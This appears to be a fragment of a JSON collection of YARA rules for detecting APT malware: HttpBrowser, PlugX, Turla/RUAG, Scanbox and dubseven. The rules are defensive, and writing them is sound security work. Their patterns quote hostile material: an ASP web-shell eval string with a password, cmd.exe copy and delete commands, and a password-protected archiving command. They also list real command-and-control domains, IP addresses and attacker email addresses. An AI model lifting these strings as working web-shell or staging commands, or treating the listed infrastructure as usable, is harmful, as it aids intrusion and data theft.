  "HttpBrowser_RAT_Sample2": "rule HttpBrowser_RAT_Sample2  \n{\n\n    meta:\n        description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Sample\"\n        author = \"Florian Roth\"\n        reference = \"http://snip.ly/giNB\"\n        date = \"2015-08-06\"\n        score = 80\n        hash1 = \"c57c5a2c322af2835ae136b75283eaaeeaa6aa911340470182a9983ae47b8992\"\n   \n    strings:\n        $s0 = \"nKERNEL32.DLL\" fullword wide\n        $s1 = \"WUSER32.DLL\" fullword wide\n        $s2 = \"mscoree.dll\" fullword wide\n        $s3 = \"VPDN_LU.exeUT\" fullword ascii\n   \n    condition:\n        uint16(0) == 0x5a4d and filesize < 250KB and all of them\n}",
  "HttpBrowser_RAT_Gen": "rule HttpBrowser_RAT_Gen \n{\n\n    meta:\n        description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Generic\"\n        author = \"Florian Roth\"\n        reference = \"http://snip.ly/giNB\"\n        date = \"2015-08-06\"\n        score = 90\n        hash1 = \"0299493ccb175d452866f5e21d023d3e92cd8d28452517d1d19c0f05f2c5ca27\"\n        hash2 = \"065d055a90da59b4bdc88b97e537d6489602cb5dc894c5c16aff94d05c09abc7\"\n        hash3 = \"05c7291db880f94c675eea336ecd66338bd0b1d49ad239cc17f9df08106e6684\"\n        hash4 = \"07133f291fe022cd14346cd1f0a649aa2704ec9ccadfab809ca9c48b91a7d81b\"\n        hash5 = \"0f8893e87ddec3d98e39a57f7cd530c28e36d596ea0a1d9d1e993dc2cae0a64d\"\n        hash6 = \"108e6633744da6efe773eb78bd0ac804920add81c3dde4b26e953056ac1b26c5\"\n        hash7 = \"1052ad7f4d49542e4da07fa8ea59c15c40bc09a4d726fad023daafdf05866ebb\"\n        hash8 = \"1277ede988438d4168bb5b135135dd3b9ae7d9badcdf1421132ca4692dd18386\"\n        hash9 = \"19be90c152f7a174835fd05a0b6f722e29c648969579ed7587ae036679e66a7b\"\n        hash10 = \"1e7133bf5a9fe5e462321aafc2b7770b8e4183a66c7fef14364a0c3f698a29af\"\n        hash11 = \"2264e5e8fcbdcb29027798b200939ecd8d1d3ad1ef0aef2b8ce7687103a3c113\"\n        hash12 = \"2a1bdeb0a021fb0bdbb328bd4b65167d1f954c871fc33359cb5ea472bad6e13e\"\n        hash13 = \"259a2e0508832d0cf3f4f5d9e9e1adde17102d2804541a9587a9a4b6f6f86669\"\n        hash14 = \"240d9ce148091e72d8f501dbfbc7963997d5c2e881b4da59a62975ddcbb77ca2\"\n        hash15 = \"211a1b195cf2cc70a2caf8f1aafb8426eb0e4bae955e85266490b12b5322aa16\"\n        hash16 = \"2d25c6868c16085c77c58829d538b8f3dbec67485f79a059f24e0dce1e804438\"\n        hash17 = \"2d932d764dd9b91166361d8c023d64a4480b5b587a6087b0ce3d2ac92ead8a7d\"\n        hash18 = \"3556722d9aa37beadfa6ba248a66576f767e04b09b239d3fb0479fa93e0ba3fd\"\n        hash19 = \"365e1d4180e93d7b87ba28ce4369312cbae191151ac23ff4a35f45440cb9be48\"\n        hash20 = \"36c49f18ce3c205152eef82887eb3070e9b111d35a42b534b2fb2ee535b543c0\"\n        hash21 = \"3eeb1fd1f0d8ab33f34183893c7346ddbbf3c19b94ba3602d377fa2e84aaad81\"\n        hash22 = \"3fa8d13b337671323e7fe8b882763ec29b6786c528fa37da773d95a057a69d9a\"\n  \n    strings:\n        $s0 = \"%d|%s|%04d/%02d/%02d %02d:%02d:%02d|%ld|%d\" fullword wide \n        $s1 = \"HttpBrowser/1.0\" fullword wide\n        $s2 = \"set cmd : %s\" ascii fullword\n        $s3 = \"\\\\config.ini\" wide fullword\n  \n    condition:\n        uint16(0) == 0x5a4d and filesize < 45KB and filesize > 20KB and all of them\n}",
  "PlugX_NvSmartMax_Gen": "rule PlugX_NvSmartMax_Gen \n{\n\n    meta:\n        description = \"Threat Group 3390 APT Sample - PlugX NvSmartMax Generic\"\n        author = \"Florian Roth\"\n        reference = \"http://snip.ly/giNB\"\n        date = \"2015-08-06\"\n        score = 70\n        hash1 = \"718fc72942b9b706488575c0296017971170463f6f40fa19b08fc84b79bf0cef\"\n        hash2 = \"1c0379481d17fc80b3330f148f1b87ff613cfd2a6601d97920a0bcd808c718d0\"\n        hash3 = \"555952aa5bcca4fa5ad5a7269fece99b1a04816d104ecd8aefabaa1435f65fa5\"\n        hash4 = \"71f7a9da99b5e3c9520bc2cc73e520598d469be6539b3c243fb435fe02e44338\"\n        hash5 = \"65bbf0bd8c6e1ccdb60cf646d7084e1452cb111d97d21d6e8117b1944f3dc71e\"\n    \n    strings:\n        $s0 = \"NvSmartMax.dll\" fullword ascii\n        $s1 = \"NvSmartMax.dll.url\" fullword ascii\n        $s2 = \"Nv.exe\" fullword ascii\n        $s4 = \"CryptProtectMemory failed\" fullword ascii \n        $s5 = \"CryptUnprotectMemory failed\" fullword ascii \n        $s7 = \"r%.*s(%d)%s\" fullword wide\n        $s8 = \" %s CRC \" fullword wide\n        $op0 = { c6 05 26 49 42 00 01 eb 4a 8d 85 00 f8 ff ff 50 } /* Opcode */\n        $op1 = { 8d 85 c8 fe ff ff 50 8d 45 c8 50 c6 45 47 00 e8 } /* Opcode */\n        $op2 = { e8 e6 65 00 00 50 68 10 43 41 00 e8 56 84 00 00 } /* Opcode */\n \n    condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and all of ($s*) and 1 of ($op*)\n}",
  "HttpBrowser_RAT_dropper_Gen2": "rule HttpBrowser_RAT_dropper_Gen2 \n{\n\n    meta:\n        description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Dropper\"\n        author = \"Florian Roth\"\n        reference = \"http://snip.ly/giNB\"\n        date = \"2015-08-06\"\n        score = 70\n        hash1 = \"c57c5a2c322af2835ae136b75283eaaeeaa6aa911340470182a9983ae47b8992\"\n        hash2 = \"dfa984174268a9f364d856fd47cfaca75804640f849624d69d81fcaca2b57166\"\n   \n    strings:\n        $s1 = \"navlu.dll.urlUT\" fullword ascii\n        $s2 = \"VPDN_LU.exeUT\" fullword ascii\n        $s3 = \"pnipcn.dllUT\" fullword ascii\n        $s4 = \"\\\\ssonsvr.exe\" fullword ascii\n        $s5 = \"/c del /q %s\" fullword ascii\n        $s6 = \"\\\\setup.exe\" fullword ascii \n        $s7 = \"msi.dllUT\" fullword ascii\n        $op0 = { 8b 45 0c 83 38 00 0f 84 98 } /* Opcode */\n        $op1 = { e8 dd 07 00 00 ff 35 d8 fb 40 00 8b 35 7c a0 40 } /* Opcode */\n        $op2 = { 83 fb 08 75 2c 8b 0d f8 af 40 00 89 4d dc 8b 0d } /* Opcode */\n        $op3 = { c7 43 18 8c 69 40 00 e9 da 01 00 00 83 7d f0 00 } /* Opcode */\n        $op4 = { 6a 01 e9 7c f8 ff ff bf 1a 40 00 96 1b 40 00 01 } /* Opcode */\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and 3 of ($s*) and 1 of ($op*)\n}",
  "ThreatGroup3390_Strings": "rule ThreatGroup3390_Strings \n{\n\n    meta:\n        description = \"Threat Group 3390 APT - Strings\"\n        author = \"Florian Roth\"\n        reference = \"http://snip.ly/giNB\"\n        date = \"2015-08-06\"\n        score = 60\n \n    strings:\n        $s1 = \"\\\"cmd\\\" /c cd /d \\\"c:\\\\Windows\\\\Temp\\\\\\\"&copy\" ascii\n        $s2 = \"svchost.exe a -k -r -s -m5 -v1024000 -padmin-windows2014\"\n        $s3 = \"ren *.rar *.zip\" fullword ascii\n        $s4 = \"c:\\\\temp\\\\ipcan.exe\" fullword ascii\n        $s5 = \"<%eval(Request.Item(\\\"admin-na-google123!@#\" ascii\n \n    condition:\n        1 of them and filesize < 30KB\n}",
  "ThreatGroup3390_C2": "rule ThreatGroup3390_C2\n{\n\n    meta:\n        description = \"Threat Group 3390 APT - C2 Server\"\n        author = \"Florian Roth\"\n        reference = \"http://snip.ly/giNB\"\n        date = \"2015-08-06\"\n        score = 60\n\n    strings:\n        $s1 = \"api.apigmail.com\"\n        $s2 = \"apigmail.com\"\n        $s3 = \"backup.darkhero.org\"\n        $s4 = \"bel.updatawindows.com\"\n        $s5 = \"binary.update-onlines.org\"\n        $s6 = \"blackcmd.com\"\n        $s7 = \"castle.blackcmd.com\"\n        $s8 = \"ctcb.blackcmd.com\"\n        $s9 = \"darkhero.org\"\n        $s10 = \"dav.local-test.com\"\n        $s11 = \"test.local-test.com\"\n        $s12 = \"dev.local-test.com\"\n        $s13 = \"ocean.local-test.com\"\n        $s14 = \"ga.blackcmd.com\"\n        $s15 = \"helpdesk.blackcmd.com\"\n        $s16 = \"helpdesk.csc-na.com\"\n        $s17 = \"helpdesk.hotmail-onlines.com\"\n        $s18 = \"helpdesk.lnip.org\"\n        $s19 = \"hotmail-onlines.com\"\n        $s20 = \"jobs.hotmail-onlines.com\"\n        $s21 = \"justufogame.com\"\n        $s22 = \"lnip.org\"\n        $s23 = \"local-test.com\"\n        $s24 = \"login.hansoftupdate.com\"\n        $s25 = \"long.update-onlines.org\"\n        $s26 = \"longlong.update-onlines.org\"\n        $s27 = \"longshadow.dyndns.org\"\n        $s28 = \"longshadow.update-onlines.org\"\n        $s29 = \"longykcai.update-onlines.org\"\n        $s30 = \"lostself.update-onlines.org\"\n        $s31 = \"mac.navydocument.com\"\n        $s32 = \"mail.csc-na.com\"\n        $s33 = \"mantech.updatawindows.com\"\n        $s34 = \"micr0soft.org\"\n        $s35 = \"microsoft-outlook.org\"\n        $s36 = \"mtc.navydocument.com\"\n        $s37 = \"navydocument.com\"\n        $s38 = \"mtc.update-onlines.org\"\n        $s39 = \"news.hotmail-onlines.com\"\n        $s40 = \"oac.3322.org\"\n        $s41 = \"ocean.apigmail.com\"\n        $s42 = \"pchomeserver.com\"\n        $s43 = \"registre.organiccrap.com\"\n        $s44 = \"security.pomsys.org\"\n        $s45 = \"services.darkhero.org\"\n        $s46 = \"sgl.updatawindows.com\"\n        $s47 = \"shadow.update-onlines.org\"\n        $s48 = \"sonoco.blackcmd.com\"\n        $s49 = \"test.logmastre.com\"\n        $s50 = \"up.gtalklite.com\"\n        $s51 = \"updatawindows.com\"\n        $s52 = \"update-onlines.org\"\n        $s53 = \"update.deepsoftupdate.com\"\n        $s54 = \"update.hancominc.com\"\n        $s55 = \"update.micr0soft.org\"\n        $s56 = \"update.pchomeserver.com\"\n        $s57 = \"urs.blackcmd.com\"\n        $s58 = \"wang.darkhero.org\"\n        $s59 = \"webs.local-test.com\"\n        $s60 = \"word.apigmail.com\"\n        $s61 = \"wordpress.blackcmd.com\"\n        $s62 = \"working.blackcmd.com\"\n        $s63 = \"working.darkhero.org\"\n        $s64 = \"working.hotmail-onlines.com\"\n        $s65 = \"www.trendmicro-update.org\"\n        $s66 = \"www.update-onlines.org\"\n        $s67 = \"x.apigmail.com\"\n        $s68 = \"ykcai.update-onlines.org\"\n        $s69 = \"ykcailostself.dyndns-free.com\"\n        $s70 = \"ykcainobody.dyndns.org\"\n        $s71 = \"zj.blackcmd.com\"\n        $s72 = \"laxness-lab.com\"\n        $s73 = \"google-ana1ytics.com\"\n        $s74 = \"www.google-ana1ytics.com\"\n        $s75 = \"ftp.google-ana1ytics.com\"\n        $s76 = \"hotmailcontact.net\"\n        $s77 = \"208.115.242.36\"\n        $s78 = \"208.115.242.37\"\n        $s79 = \"208.115.242.38\"\n        $s80 = \"66.63.178.142\"\n        $s81 = \"72.11.148.220\"\n        $s82 = \"72.11.141.133\"\n        $s83 = \"74.63.195.236\"\n        $s84 = \"74.63.195.236\"\n        $s85 = \"74.63.195.237\"\n        $s86 = \"74.63.195.238\"\n        $s87 = \"103.24.0.142\"\n        $s88 = \"103.24.1.54\"\n        $s89 = \"106.187.45.162\"\n        $s90 = \"192.151.236.138\"\n        $s91 = \"192.161.61.19\"\n        $s92 = \"192.161.61.20\"\n        $s93 = \"192.161.61.22\"\n        $s94 = \"103.24.1.54\"\n        $s95 = \"67.215.232.179\"\n        $s96 = \"96.44.177.195\"\n        $s97 = \"49.143.192.221\"\n        $s98 = \"67.215.232.181\"\n        $s99 = \"67.215.232.182\"\n        $s100 = \"96.44.182.243\"\n        $s101 = \"96.44.182.245\"\n        $s102 = \"96.44.182.246\"\n        $s103 = \"49.143.205.30\"\n        $s104 = \"working_success@163.com\"\n        $s105 = \"ykcaihyl@163.com\"\n        $s106 = \"working_success@163.com\"\n        $s107 = \"yuming@yinsibaohu.aliyun.com\"\n   \n    condition:\n        uint16(0) == 0x5a4d and 1 of them\n}",
  "apt_all_JavaScript_ScanboxFramework_obfuscated": "rule apt_all_JavaScript_ScanboxFramework_obfuscated\n\n{\n              meta:\n                    \n                    ref = \"https://www.fidelissecurity.com/TradeSecret\"\n\n                  strings:\n\n              $sa1 = /(var|new|return)\\s[_\\$]+\\s?/\n\n                  $sa2 = \"function\"\n\n                  $sa3 = \"toString\"\n\n                  $sa4 = \"toUpperCase\"\n\n                  $sa5 = \"arguments.length\"\n\n                  $sa6 = \"return\"\n\n                  $sa7 = \"while\"\n\n                  $sa8 = \"unescape(\"\n\n                  $sa9 = \"365*10*24*60*60*1000\"\n\n                  $sa10 = \">> 2\"\n\n                  $sa11 = \"& 3) << 4\"\n\n                  $sa12 = \"& 15) << 2\"\n\n                  $sa13 = \">> 6) | 192\"\n\n                  $sa14 = \"& 63) | 128\"\n\n                  $sa15 = \">> 12) | 224\"\n\n                  condition:\n\n                  all of them\n\n}",
  "Turla_APT_srsvc": "rule Turla_APT_srsvc \n{\n\n    meta:\n        description = \"Detects Turla malware (based on sample used in the RUAG APT case)\"\n        author = \"Florian Roth\"\n        family = \"Turla\"\n        reference = \"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case\"\n        date = \"2016-06-09\"\n        hash1 = \"65996f266166dbb479a42a15a236e6564f0b322d5d68ee546244d7740a21b8f7\"\n        hash2 = \"25c7ff1eb16984a741948f2ec675ab122869b6edea3691b01d69842a53aa3bac\"\n  \n    strings:\n        $x1 = \"SVCHostServiceDll.dll\" fullword ascii\n        $s2 = \"msimghlp.dll\" fullword wide\n        $s3 = \"srservice\" fullword wide\n        $s4 = \"ModStart\" fullword ascii\n        $s5 = \"ModStop\" fullword ascii\n    \n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 20KB and ( 1 of ($x*) or all of ($s*) ) ) or ( all of them )\n}",
  "Turla_APT_Malware_Gen1": "rule Turla_APT_Malware_Gen1 \n{\n\n    meta:\n        description = \"Detects Turla malware (based on sample used in the RUAG APT case)\"\n        author = \"Florian Roth\"\n        family = \"Turla\"\n        reference = \"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case\"\n        date = \"2016-06-09\"\n        hash1 = \"0e1bf347c37fb199886f1e675e372ba55ac4627e8be2f05a76c2c64f9b6ed0e4\"\n        hash2 = \"7206075cd8f1004e8f1f759d46e98bfad4098b8642412811a214c0155a1f08b9\"\n        hash3 = \"fe3ffd7438c0d38484bf02a78a19ea81a6f51b4b3f2b2228bd21974c2538bbcd\"\n        hash4 = \"c49111af049dd9746c6b1980db6e150b2a79ca1569b23ed2cba81c85c00d82b4\"\n        hash5 = \"b62a643c96e2e41f639d2a8ce11d61e6b9d7fb3a9baf011120b7fec1b4ee3cf4\"\n        hash6 = \"edb12790b5cd959bc2e53a4b369a4fd747153e6c9d50f6a69ff047f7857a4348\"\n        hash7 = \"8f2ea0f916fda1dfb771f5441e919c561da5b6334b9f2fffcbf53db14063b24a\"\n        hash8 = \"8dddc744bbfcf215346c812aa569e49523996f73a1f22fe4e688084ce1225b98\"\n        hash9 = \"0c69258adcc97632b729e55664c22cd942812336d41e8ea0cff9ddcafaded20f\"\n        hash10 = \"2b4fba1ef06f85d1395945db40a9f2c3b3ed81b56fb9c2d5e5bb693c230215e2\"\n    \n    strings:\n        $x1 = \"too long data for this type of transport\" fullword ascii\n        $x2 = \"not enough server resources to complete operation\" fullword ascii\n        $x3 = \"Task not execute. Arg file failed.\" fullword ascii\n        $x4 = \"Global\\\\MSCTF.Shared.MUTEX.ZRX\" fullword ascii\n        $s1 = \"peer has closed the connection\" fullword ascii\n        $s2 = \"tcpdump.exe\" fullword ascii\n        $s3 = \"windump.exe\" fullword ascii\n        $s4 = \"dsniff.exe\" fullword ascii\n        $s5 = \"wireshark.exe\" fullword ascii\n        $s6 = \"ethereal.exe\" fullword ascii\n        $s7 = \"snoop.exe\" fullword ascii\n        $s8 = \"ettercap.exe\" fullword ascii\n        $s9 = \"miniport.dat\" fullword ascii\n        $s10 = \"net_password=%s\" fullword ascii\n    \n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 2 of ($x*) or 8 of ($s*) ) ) or ( 12 of them )\n}",
  "Turla_APT_Malware_Gen2": "rule Turla_APT_Malware_Gen2 \n{\n\n    meta:\n        description = \"Detects Turla malware (based on sample used in the RUAG APT case)\"\n        author = \"Florian Roth\"\n        family = \"Turla\"\n        reference = \"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case\"\n        date = \"2016-06-09\"\n        hash1 = \"0e1bf347c37fb199886f1e675e372ba55ac4627e8be2f05a76c2c64f9b6ed0e4\"\n        hash2 = \"7206075cd8f1004e8f1f759d46e98bfad4098b8642412811a214c0155a1f08b9\"\n        hash3 = \"fe3ffd7438c0d38484bf02a78a19ea81a6f51b4b3f2b2228bd21974c2538bbcd\"\n        hash4 = \"c49111af049dd9746c6b1980db6e150b2a79ca1569b23ed2cba81c85c00d82b4\"\n  \n    strings:\n        $x1 = \"Internal command not support =((\" fullword ascii\n        $x2 = \"L|-1|AS_CUR_USER:OpenProcessToken():%d, %s|\" fullword ascii\n        $x3 = \"L|-1|CreateProcessAsUser():%d, %s|\" fullword ascii\n        $x4 = \"AS_CUR_USER:OpenProcessToken():%d\" fullword ascii\n        $x5 = \"L|-1|AS_CUR_USER:LogonUser():%d, %s|\" fullword ascii\n        $x6 = \"L|-1|try to run dll %s with user priv|\" fullword ascii\n        $x7 = \"\\\\\\\\.\\\\Global\\\\PIPE\\\\sdlrpc\" fullword ascii\n        $x8 = \"\\\\\\\\%s\\\\pipe\\\\comnode\" fullword ascii\n        $x9 = \"Plugin dll stop failed.\" fullword ascii\n        $x10 = \"AS_USER:LogonUser():%d\" fullword ascii\n        $s1 = \"MSIMGHLP.DLL\" fullword wide\n        $s2 = \"msimghlp.dll\" fullword ascii\n        $s3 = \"ximarsh.dll\" fullword ascii\n        $s4 = \"msximl.dll\" fullword ascii\n        $s5 = \"INTERNAL.dll\" fullword ascii\n        $s6 = \"\\\\\\\\.\\\\Global\\\\PIPE\\\\\" fullword ascii\n        $s7 = \"ieuser.exe\" fullword ascii\n    \n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 1 of ($x*) or 5 of ($s*) ) ) or ( 10 of them )\n}",
  "Turla_APT_Malware_Gen3": "rule Turla_APT_Malware_Gen3 \n{\n\n    meta:\n        description = \"Detects Turla malware (based on sample used in the RUAG APT case)\"\n        author = \"Florian Roth\"\n        family = \"Turla\"\n        reference = \"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case\"\n        date = \"2016-06-09\"\n        hash1 = \"c49111af049dd9746c6b1980db6e150b2a79ca1569b23ed2cba81c85c00d82b4\"\n        hash2 = \"b62a643c96e2e41f639d2a8ce11d61e6b9d7fb3a9baf011120b7fec1b4ee3cf4\"\n        hash3 = \"edb12790b5cd959bc2e53a4b369a4fd747153e6c9d50f6a69ff047f7857a4348\"\n        hash4 = \"8f2ea0f916fda1dfb771f5441e919c561da5b6334b9f2fffcbf53db14063b24a\"\n        hash5 = \"8dddc744bbfcf215346c812aa569e49523996f73a1f22fe4e688084ce1225b98\"\n        hash6 = \"0c69258adcc97632b729e55664c22cd942812336d41e8ea0cff9ddcafaded20f\"\n        hash7 = \"2b4fba1ef06f85d1395945db40a9f2c3b3ed81b56fb9c2d5e5bb693c230215e2\"\n        hash8 = \"7206075cd8f1004e8f1f759d46e98bfad4098b8642412811a214c0155a1f08b9\"\n        hash9 = \"edb12790b5cd959bc2e53a4b369a4fd747153e6c9d50f6a69ff047f7857a4348\"\n  \n    strings:\n        $x1 = \"\\\\\\\\.\\\\pipe\\\\sdlrpc\" fullword ascii\n        $x2 = \"WaitMutex Abandoned %p\" fullword ascii\n        $x3 = \"OPER|Wrong config: no port|\" fullword ascii\n        $x4 = \"OPER|Wrong config: no lastconnect|\" fullword ascii\n        $x5 = \"OPER|Wrong config: empty address|\" fullword ascii\n        $x6 = \"Trans task %d obj %s ACTIVE fail robj %s\" fullword ascii\n        $x7 = \"OPER|Wrong config: no auth|\" fullword ascii\n        $x8 = \"OPER|Sniffer '%s' running... ooopppsss...|\" fullword ascii\n        $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\5.0\\\\User Agent\\\\Post Platform\" fullword ascii\n        $s2 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\5.0\\\\User Agent\\\\Pre Platform\" fullword ascii\n        $s3 = \"www.yahoo.com\" fullword ascii\n        $s4 = \"MSXIML.DLL\" fullword wide\n        $s5 = \"www.bing.com\" fullword ascii\n        $s6 = \"%s: http://%s%s\" fullword ascii\n        $s7 = \"/javascript/view.php\" fullword ascii\n        $s8 = \"Task %d failed %s,%d\" fullword ascii\n        $s9 = \"Mozilla/4.0 (compatible; MSIE %d.0; \" fullword ascii\n   \n    condition:\n        ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 1 of ($x*) or 6 of ($s*) ) ) or ( 10 of them )\n}",
  "RUAG_Tavdig_Malformed_Executable": "rule RUAG_Tavdig_Malformed_Executable \n{\n\n  meta:\n    description = \"Detects an embedded executable with a malformed header - known from Tavdig malware\"\n    author = \"Florian Roth\"\n    reference = \"https://goo.gl/N5MEj0\"\n    score = 60\n  \n  condition:\n  /* MZ Header and malformed PE header > 0x0bad */\n    uint16(0) == 0x5a4d and uint32(uint32(0x3C)) == 0x0000AD0B \n}",
  "RUAG_Bot_Config_File": "rule RUAG_Bot_Config_File \n{\n\n  meta:\n    description = \"Detects a specific config file used by malware in RUAG APT case\"\n    author = \"Florian Roth\"\n    reference = \"https://goo.gl/N5MEj0\"\n    score = 60\n  \n  strings:\n    $s1 = \"[CONFIG]\" ascii\n    $s2 = \"name = \" ascii\n    $s3 = \"exe = cmd.exe\" ascii\n  \n  condition:\n    $s1 at 0 and $s2 and $s3 and filesize < 160 \n}",
  "RUAG_Cobra_Malware": "rule RUAG_Cobra_Malware \n{\n\n  meta:\n    description = \"Detects a malware mentioned in the RUAG Case called Carbon/Cobra\"\n    author = \"Florian Roth\"\n    reference = \"https://goo.gl/N5MEj0\"\n    score = 60\n \n  strings:\n    $s1 = \"\\\\Cobra\\\\Release\\\\Cobra.pdb\" ascii\n  \n  condition:\n    uint16(0) == 0x5a4d and $s1\n}",
  "RUAG_Cobra_Config_File": "rule RUAG_Cobra_Config_File \n{\n\n  meta:\n    description = \"Detects a config text file used by malware Cobra in RUAG case\"\n    author = \"Florian Roth\"\n    reference = \"https://goo.gl/N5MEj0\"\n    score = 60\n\n  strings:\n    $h1 = \"[NAME]\" ascii\n    $s1 = \"object_id=\" ascii\n    $s2 = \"[TIME]\" ascii fullword\n    $s3 = \"lastconnect\" ascii \n    $s4 = \"[CW_LOCAL]\" ascii fullword\n    $s5 = \"system_pipe\" ascii\n    $s6 = \"user_pipe\" ascii\n    $s7 = \"[TRANSPORT]\" ascii\n    $s8 = \"run_task_system\" ascii\n    $s9 = \"[WORKDATA]\" ascii \n    $s10 = \"address1\" ascii\n  \n  condition:\n    $h1 at 0 and 8 of ($s*) and filesize < 5KB\n}",
  "RUAG_Exfil_Config_File": "rule RUAG_Exfil_Config_File \n{\n\n  meta:\n    description = \"Detects a config text file used in data exfiltration in RUAG case\"\n    author = \"Florian Roth\"\n    reference = \"https://goo.gl/N5MEj0\"\n    score = 60\n\n  strings:\n    $h1 = \"[TRANSPORT]\" ascii\n    $s1 = \"system_pipe\" ascii\n    $s2 = \"spstatus\" ascii\n    $s3 = \"adaptable\" ascii \n    $s4 = \"post_frag\" ascii\n    $s5 = \"pfsgrowperiod\" ascii\n  \n  condition:\n    $h1 at 0 and all of ($s*) and filesize < 1KB\n}",
  "WaterBug_turla_dll": "rule WaterBug_turla_dll \n{\n  \n    meta:\n        description = \"Symantec Waterbug Attack - Trojan Turla DLL\"\n        author = \"Symantec Security Response\"\n        date = \"22.01.2015\"\n        reference = \"http://www.symantec.com/connect/blogs/turla-spying-tool-targets-governments-and-diplomats\"   \n\n    strings:\n        $a = /([A-Za-z0-9]{2,10}_){,2}Win32\\.dll\\x00/\n   \n    condition:\n        pe.exports(\"ee\") and $a\n}",
  "turla_dropper": "rule turla_dropper\n{ \n   \n    meta:\n        maltype = \"turla dropper\"\n        ref = \"https://github.com/reed1713\"\n        reference = \"http://info.baesystemsdetica.com/rs/baesystems/images/snake_whitepaper.pdf\"\n        date = \"3/13/2014\"\n        description = \"This sample was pulled from the bae systems snake campaign report. The Turla dropper creates a file in teh temp dir and registers an auto start service call \\\"RPC Endpoint Locator\\\".\"\n    strings:\n\n        $type=\"Microsoft-Windows-Security-Auditing\"\n        $eventid=\"4688\"\n        $data=\"AppData\\\\Local\\\\Temp\\\\rsys.exe\"\n\n        $type1=\"Service Control Manager\"\n        $eventid1=\"7036\"\n        $data1=\"RPC Endpoint Locator\"\n        $data2=\"running\"\n\n        $type2=\"Service Control Manager\"\n        $eventid2=\"7045\"\n        $data3=\"RPC Endpoint Locator\"\n        $data4=\"user mode service\" \n        $data5=\"auto start\"\n\n    condition:\n    ($type and $eventid and $data) or ($type1 and $eventid1 and $data1 and $data2 and $type2 and $eventid2 and $data3 and $data4 and $data5)\n}",
  "dubseven_file_set": "rule dubseven_file_set\n{\n    \n    meta:\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        desc = \"Searches for service files loading UP007\"\n    \n    strings:\n        $file1 = \"\\\\Microsoft\\\\Internet Explorer\\\\conhost.exe\"\n        $file2 = \"\\\\Microsoft\\\\Internet Explorer\\\\dll2.xor\"\n        $file3 = \"\\\\Microsoft\\\\Internet Explorer\\\\HOOK.DLL\"\n        $file4 = \"\\\\Microsoft\\\\Internet Explorer\\\\main.dll\"\n        $file5 = \"\\\\Microsoft\\\\Internet Explorer\\\\nvsvc.exe\"\n        $file6 = \"\\\\Microsoft\\\\Internet Explorer\\\\SBieDll.dll\"\n        $file7 = \"\\\\Microsoft\\\\Internet Explorer\\\\mon\"\n        $file8 = \"\\\\Microsoft\\\\Internet Explorer\\\\runas.exe\"\n        \n    condition:\n        //MZ header //PE signature //Just a few of these as they differ\n\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 3 of ($file*)\n}",
  "dubseven_dropper_registry_checks": "rule dubseven_dropper_registry_checks\n{\n    \n    meta:\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        desc = \"Searches for registry keys checked for by the dropper\"\n    \n    strings:\n        $reg1 = \"SOFTWARE\\\\360Safe\\\\Liveup\"\n        $reg2 = \"Software\\\\360safe\"\n        $reg3 = \"SOFTWARE\\\\kingsoft\\\\Antivirus\"\n        $reg4 = \"SOFTWARE\\\\Avira\\\\Avira Destop\"\n        $reg5 = \"SOFTWARE\\\\rising\\\\RAV\"\n        $reg6 = \"SOFTWARE\\\\JiangMin\"\n        $reg7 = \"SOFTWARE\\\\Micropoint\\\\Anti-Attack\"\n\n    condition:\n        //MZ header //PE signature\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and all of ($reg*)\n}",
  "dubseven_dropper_dialog_remains": "rule dubseven_dropper_dialog_remains\n{\n   \n    meta:\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        desc = \"Searches for related dialog remnants. How rude.\"\n    \n    strings:\n        $dia1 = \"fuckMessageBox 1.0\" wide\n        $dia2 = \"Rundll 1.0\" wide\n        \n    condition:\n        //MZ header //PE signature\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and any of them\n}",
  "maindll_mutex": "rule maindll_mutex\n{\n   \n    meta:\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        desc = \"Matches on the maindll mutex\"\n        ref = \"https://citizenlab.org/2016/04/between-hong-kong-and-burma/\"\n        \n    strings:\n        $mutex = \"h31415927tttt\"\n        \n    condition:\n        //MZ header  //PE signature\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $mutex\n}",
  "SLServer_dialog_remains": "rule SLServer_dialog_remains\n{\n    \n    meta:\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        desc = \"Searches for related dialog remnants.\"\n        ref = \"https://citizenlab.org/2016/04/between-hong-kong-and-burma/\"\n    \n    strings:\n        $slserver = \"SLServer\" wide\n        \n    condition:\n        //MZ header //PE signature\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $slserver\n}",
  "SLServer_mutex": "rule SLServer_mutex\n{\n    \n    meta:\n        author = \"Matt Brooks, @cmatthewbrooks\"\n        desc = \"Searches for the mutex.\"\n        ref = \"https://citizenlab.org/2016/04/between-hong-kong-and-burma/\"\n    \n    strings:\n        $mutex = \"M&GX^DSF&DA@F\"\n        \n    condition:\n        //MZ header //PE signature\n        uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $mutex\n}",
